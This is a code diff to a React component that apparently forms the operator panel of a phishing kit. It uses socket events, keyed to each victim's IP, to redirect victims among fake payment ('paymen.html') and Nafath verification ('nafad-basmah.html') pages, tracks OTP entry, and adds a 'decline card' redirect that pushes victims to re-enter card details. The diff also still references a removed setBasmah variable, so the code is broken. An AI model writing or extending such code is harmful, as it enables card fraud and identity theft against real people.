@@ -33,7 +33,6 @@ const LABEL = {
 
 export default function CardModal({ ip, user, onClose }) {
   const [confirm, setConfirm] = useState({ show: false, page: null });
-  const [basmah, setBasmah] = useState("");
 
   // blink states
   const [blinkOtp, setBlinkOtp] = useState(false);
@@ -80,18 +79,21 @@ export default function CardModal({ ip, user, onClose }) {
   } = user;
 
   const handlePageClick = (page) => setConfirm({ show: true, page });
-  const hideConfirm = () => { setConfirm({ show: false, page: null }); setBasmah(""); };
+  const hideConfirm = () => setConfirm({ show: false, page: null });
 
   const handleConfirm = () => {
-    if (confirm.page === "nafad-basmah.html" && basmah) {
-      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
-    }
     socket.emit("navigateTo", { ip, page: confirm.page });
     hideConfirm();
   };
 
   const handleDecline = () => {
     socket.emit("navigateTo", { ip, page: `${confirm.page}?declined=true` });
+    hideConfirm();
+  };
+
+  // رفض البطاقة من verify — يرسل navigateTo لـ paymen.html مع declined
+  const handleDeclineCard = () => {
+    socket.emit("navigateTo", { ip, page: "paymen.html?declined=true" });
     hideConfirm();
   };
 
@@ -206,6 +208,7 @@ export default function CardModal({ ip, user, onClose }) {
         onBasmahChange={setBasmah}
         onConfirm={handleConfirm}
         onDecline={handleDecline}
+        onDeclineCard={handleDeclineCard}
         onClose={hideConfirm}
       />
     </>
